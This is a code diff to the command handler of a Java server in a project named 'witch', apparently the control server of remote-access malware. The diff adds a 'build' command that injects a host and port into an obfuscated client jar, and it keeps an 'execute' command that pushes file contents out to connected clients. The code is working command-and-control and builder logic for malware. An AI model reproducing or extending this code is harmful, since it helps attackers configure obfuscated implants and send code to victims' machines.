@@ -1,6 +1,7 @@
 package me.soda.witch.server.server;
 
 import me.soda.witch.server.Main;
+import me.soda.witch.server.injector.ConfigModifier;
 import me.soda.witch.server.web.WSServer;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -15,18 +16,28 @@ public class CommandHandler {
         String[] msgArr = in.split(" ");
         if (msgArr.length > 0) {
             try {
-                if (msgArr[0].equals("stop")) {
-                    Main.inputStream.close();
-                    server.stop();
-                    wsServer.stop();
-                } else {
-                    if (msgArr.length >= 2 && msgArr[0].equals("execute")) {
+                switch (msgArr[0]) {
+                    case "stop" -> {
+                        Main.inputStream.close();
+                        server.stop();
+                        wsServer.stop();
+                    }
+                    case "build" -> {
+                        try {
+                            if (msgArr.length == 4) {
+                                ConfigModifier.modifyCfg("witch-1.0.0-obfuscated.jar", msgArr[1], msgArr[2], Integer.parseInt(msgArr[3]));
+                                LOGGER.info("Build finished.");
+                            }
+                        } catch (Exception e) {
+                            LOGGER.warn("build <output> <host> <port>");
+                        }
+                    }
+                    case "execute" -> {
+                        if (msgArr.length < 2) return;
                         File file = new File(in.substring(msgArr[0].length() + 1));
                         try (FileInputStream is = new FileInputStream(file)) {
-                            server.send.trySendBytes(server, msgArr[0], is.readAllBytes());
+                            server.send.trySendBytes(msgArr[0], is.readAllBytes());
                         }
-                    } else {
-                        server.send.trySendJson(server, msgArr[0]);
                     }
                 }
             } catch (Exception e) {
